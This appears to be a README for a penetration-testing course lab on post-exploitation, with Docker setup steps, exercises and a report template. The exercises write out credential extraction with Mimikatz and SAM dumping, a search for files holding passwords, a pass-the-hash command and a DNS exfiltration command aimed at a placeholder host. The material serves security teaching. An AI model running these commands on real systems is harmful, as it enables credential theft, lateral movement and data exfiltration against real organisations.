# Unit 8 - Post-Explotación, Reporte y Ética

## Objectives

1. Learn post-exploitation techniques
2. Understand system enumeration and pivoting
3. Master data exfiltration methods
4. Learn to write professional security reports
5. Understand ethical hacking principles and legal considerations

## Tools Included

- **Kali Linux**: Penetration testing distribution
- **Mimikatz**: Credential extraction
- **PowerSploit**: PowerShell post-exploitation
- **Cobalt Strike**: Advanced post-exploitation
- **BloodHound**: Active Directory enumeration

## Lab Setup

### Build and Start Containers

```bash
cd docker-labs/unit8
docker-compose up -d
```

### Access the Lab

1. **Web Interface**: http://localhost:8087 (Kali Desktop via noVNC)
2. **SSH Access**:
   ```bash
   ssh root@localhost -p 2229
   Password: toor
   ```

### Stop and Cleanup

```bash
cd docker-labs/unit8
docker-compose down

# Remove volumes (deletes all data)
docker-compose down -v
```

## Lab Exercises

### Exercise 1: System Enumeration

1. Enumerate system information:
   ```powershell
   systeminfo
   Get-WmiObject -Class Win32_OperatingSystem
   ```

2. Find sensitive files:
   ```bash
   find / -name "*.txt" -o -name "*.conf" -o -name "*.cfg" 2>/dev/null | xargs grep -l "password\|secret"
   ```

### Exercise 2: Credential Extraction

1. Use Mimikatz to extract credentials:
   ```powershell
   Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
   ```

2. Dump SAM database:
   ```bash
   reg save HKLM\SAM sam.hiv
   reg save HKLM\SYSTEM system.hiv
   samdump2 system.hiv sam.hiv > hashes.txt
   ```

### Exercise 3: Pivoting and Lateral Movement

1. Map the internal network:
   ```bash
   arp -a
   nmap -sn 192.168.0.0/24
   ```

2. Use pass-the-hash to move laterally:
   ```bash
   pth-winexe -U 'DOMAIN/USER%NTLMHASH' //192.168.0.108 "cmd.exe /c systeminfo"
   ```

### Exercise 4: Data Exfiltration

1. Compress and encrypt data:
   ```bash
   zip -r -e sensitive-data.zip /path/to/sensitive --password password123
   ```

2. Exfiltrate via DNS:
   ```bash
   python3 dns-exfil.py -d exfil.example.com -f sensitive-data.zip
   ```

### Exercise 5: Reporting

1. Use Metasploit to generate a report:
   ```bash
   msfconsole -q -x "load report; report_create"
   ```

2. Create a professional report using Markdown:
   ```markdown
   # Security Assessment Report

   ## Executive Summary

   [Summary of findings]

   ## Technical Findings

   ### Vulnerability 1: SQL Injection

   - **Severity**: Critical
   - **Location**: /login
   - **Description**: [Description]
   - **Remediation**: [Solution]
   ```

## Resources

- [Mimikatz Documentation](https://github.com/gentilkiwi/mimikatz/wiki)
- [PowerSploit Documentation](https://github.com/PowerShellMafia/PowerSploit)
- [Cobalt Strike](https://www.cobaltstrike.com/)
- [BloodHound](https://github.com/BloodHoundAD/BloodHound)
- [OWASP Reporting Guide](https://owasp.org/www-community/Vulnerability_Disclosure_Checklist)

## Troubleshooting

### Mimikatz won't load

Run PowerShell as Administrator:
```powershell
Start-Process powershell -Verb RunAs
```

### Data exfiltration fails

Check outgoing network restrictions and firewall rules
